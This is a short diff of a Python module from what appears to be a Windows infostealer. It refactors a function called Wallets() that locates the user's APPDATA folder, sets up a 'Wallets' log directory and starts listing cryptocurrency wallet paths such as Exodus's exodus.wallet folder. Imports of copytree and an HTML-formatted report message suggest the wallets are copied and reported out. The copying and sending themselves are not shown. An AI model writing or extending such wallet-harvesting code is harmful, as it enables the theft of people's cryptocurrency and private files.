@@ -1,5 +1,5 @@
-from os import getenv, mkdir, environ
-from os.path import exists
+from os import mkdir, environ
+from os.path import exists, join
 from winreg import QueryValue,HKEY_CURRENT_USER,OpenKey
 from manager.logger import Log
 from shutil import copytree
@@ -9,9 +9,8 @@ def Wallets():
     msgInfo = ""
     Log("===========Wallets===========")
     msgInfo+="\n\n\n<b>💰Wallets💰</b>"
-    roaming = getenv('APPDATA')
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\Wallets'
+    roaming = environ["APPDATA"]
+    pathToLogs = join(config.pathToLogs, "Wallets")
 
     directory = {
         'Exodus': roaming + '\\Exodus\\exodus.wallet\\',
